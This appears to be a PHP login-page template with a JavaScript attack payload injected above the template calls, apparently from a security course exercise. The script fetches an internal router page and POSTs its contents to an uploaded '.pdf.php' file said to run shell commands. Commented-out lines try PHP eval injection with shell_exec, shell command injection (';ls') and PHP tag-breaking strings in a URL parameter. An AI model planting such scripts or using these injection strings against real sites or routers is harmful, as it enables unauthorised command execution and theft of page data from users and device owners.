<script>

        /* try to inject code via the GET parameter */

	var xhttp = new XMLHttpRequest();

        xhttp.onreadystatechange = function() {
 	       if(this.readyState == 4) {

        	       // save response from previous GET request
                       var str = xhttp.responseText;

		       // new object to handle response
	    	       var rxhttp = new XMLHttpRequest();

	                        /* POST to another file: this is the hash of 'handle.pdf.php', which should
       		                 * make shell calls to 1) create a file and 2) dump the contexts of the previous
               		         * GET request out to that file */
	                        rxhttp.open('POST', '/handins/fe0e94ae124a5953ae3c7b53d638ab2920163ee8.pdf.php', true);
       		                rxhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
               		        rxhttp.send('info=' + str + '&pin=login');
       	         	}
	        };

		/* (1) check whether page uses eval(); GET requests might automatically be decoded s.t. '+' = ' '  	*/
/*     		xhttp.open('GET', 'http://router.local:80/home.php?action=view; shell_exec("echo ls")', true);		*/
/*     		xhttp.open('GET', 'http://router.local:80/home.php?action=view;+shell_exec(echo ls)', true);  		*/ /* caused crash */

		/* (2) check shell injection */
/*     		xhttp.open('GET', 'http://router.local:80/home.php?action=view ; ls', true);				*/
/*     		xhttp.open('GET', 'http://router.local:80/home.php?action=view;ls', true);				*/

		/* (3) other possible attacks */
/*     		xhttp.open('GET', 'http://router.local:80/home.php?action=?><?php+view', true);				*/
/*     		xhttp.open('GET', 'http://router.local:80/home.php?action=true){?><script>document.write("hi");</script><?php}else+if+(true', true); */ /* caused crash */
/*     		xhttp.open('GET', 'http://router.local:80/home.php?action=show', true);					*/

		/* vanilla GET request */
     		xhttp.open('GET', 'http://router.local:80/home.php?', true);
	        xhttp.send();
</script>

<?php $this->display('header.tpl', $args); ?>

<?php $this->display('login-form.tpl', $args); ?>

<?php $this->display('footer.tpl', $args); ?>
